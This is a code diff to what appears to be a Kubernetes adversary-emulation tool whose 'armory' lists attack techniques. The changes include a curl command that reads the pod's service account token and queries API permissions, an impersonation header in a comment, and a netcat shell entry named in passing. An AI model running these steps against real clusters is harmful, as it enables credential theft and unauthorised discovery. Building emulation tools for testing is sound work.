@@ -126,9 +126,9 @@ func LoadArmory(dir string) (Armory, error) {
 		{
 			Name:     "Install kubectl",
 			Tactics:  []domain.Tactic{domain.Discovery},
-			Requires: domain.Requirements{Kind: "ServiceAccount"},
+			Requires: domain.Requirements{Kind: "Pod", AccessLevel: domain.UserExec},
 			CmdVariants: map[string]string{
-				"curl": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" && chmod +x kubectl && mkdir -p ~/.local/bin && mv ./kubectl ~/.local/bin/kubectl",
+				"curl": `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && chmod +x kubectl && mkdir -p ~/.local/bin && mv ./kubectl ~/.local/bin/kubectl`,
 			},
 		},
 
@@ -139,19 +139,20 @@ func LoadArmory(dir string) (Armory, error) {
 			CmdVariants: map[string]string{
 				// "kubectl":           "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS}",
 				// "kubectl_remote_sa": "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS} --as=system:serviceaccount:${NS}:${SA.NAME}",
-				// "curl": `curl ${API_SERVER}/api/ -H "Authorization: Bearer ${TOKEN}" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt  --verbose`,
+				// -H "Impersonate-User: system:serviceaccount:${NS}:${TARGET.NAME}"
+				// -H "application/vnd.kubernetes.protobuf,application/json"
 				"curl": `curl -XPOST 
 					${API_SERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 
 					--cacert ${CA_PATH} 
-					-H "Authorizaton: Bearer ${TOKEN}" 
-					-H "application/vnd.kubernetes.protobuf,application/json" 
-					-H "Content-Type: "application/json" 
+					-H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" 
+					-H "Content-Type: application/json" 
 					--data '{
 						"kind": "SelfSubjectRulesReview",
 						"apiVersion": "authorization.k8s.io/v1",
-						"spec": { "namspace": ${NS} }"
+						"spec": { "namespace": "${NS}" }
 					}'`,
 			},
+			ResultHandler: handleSelfSubjectReviewResult,
 		},
 		{
 			Name:        "Start Netcat shell",
@@ -269,4 +270,34 @@ func handleSaTokenRead(source domain.Entity, args ...any) (domain.Event, error) 
 		SourceSystemId: source.GetId(),
 		Token:          token,
 	}, nil
+}
+
+func handleSelfSubjectReviewResult(source domain.Entity, args ...any) (domain.Event, error) {
+	// try parse JSON
+	if len(args) == 0 {
+		return nil, fmt.Errorf("No data")
+	}
+	jsonData, ok := args[0].(string)
+	if !ok {
+		return nil, fmt.Errorf("Expected string data")
+	}
+
+	var result k8s.SelfSubjectRulesReview
+	err := json.Unmarshal([]byte(jsonData), &result)
+	if err != nil {
+		return nil, fmt.Errorf("Failed to unmarshal JSON: %w", err)
+	}
+
+	if result.Code >= 400 {
+		return domain.TTPFailed{
+			Reason: result.Message,
+		}, nil
+	}
+	// return domain.SelfSubjectRulesReviewExtracted{
+	// 	Source: source,
+	// 	Result: result,
+	// }, nil
+
+	//
+	return nil, nil
 }
